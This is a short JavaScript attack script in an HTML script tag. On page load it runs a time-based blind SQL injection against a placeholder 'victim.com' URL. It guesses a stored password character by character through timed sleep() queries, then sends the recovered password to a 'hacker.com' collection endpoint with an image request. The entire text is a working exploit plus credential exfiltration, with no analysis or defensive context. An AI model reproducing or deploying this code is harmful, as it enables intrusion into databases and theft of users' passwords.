<script>
// conf
stime = 0.2;
surl = 'http://victim.com/path/?id=';
save_pass = 'http://hacker.com/savepass.php?pass=';

table_name = 'pass';
table_fieldname = 'pass';
table_id = 1;

chr_from = 32;
chr_to = 126;

// init globals counters
pos = 1;
len = 0;
padding = Math.ceil((chr_to - chr_from) / 2);
chr_pos = padding + chr_from;
//chr_pos = chr_to;
pass = '';
goodlen = 0;

function sploit() // fucking fuck fuckers
{
  if ((pos > 6) || (pos > len && goodlen)) // pass found
    {
      var img = new Image();
      alert(pass);
      img.src = save_pass+pass;
      return ;
    }
  if (padding <= 1)
    {
      pos++;
      pass += String.fromCharCode(chr_pos);
      padding = Math.ceil((chr_to - chr_from) / 2);
      chr_pos = (padding + chr_from);
    }
  var img = new Image();
  start = new Date();
  img.onerror = function (e)
    {
      end = new Date();
      if (end.getTime() - start.getTime() > stime * 1000)
	{
	  if (!goodlen)
	    goodlen = 1;
	  else
	    chr_pos += padding;
	}
      else
	{
	  if (!goodlen)
	    len++;
	  else
	    chr_pos -= padding;
	}
      if (goodlen)
	padding = Math.round(padding / 2);
      sploit();
    }
  if (!goodlen)
    query = '((select length(pass) from '+table_name+' WHERE id='+table_id+')= '+len+')';
  else
    query = '((select ascii((select substr('+table_fieldname+','+pos+',1) from '+table_name+' WHERE id='+table_id+'))>'+chr_pos+'))';
  img.src = surl+'if(('+query+'),sleep('+stime+'),0)';
}

sploit();

</script>
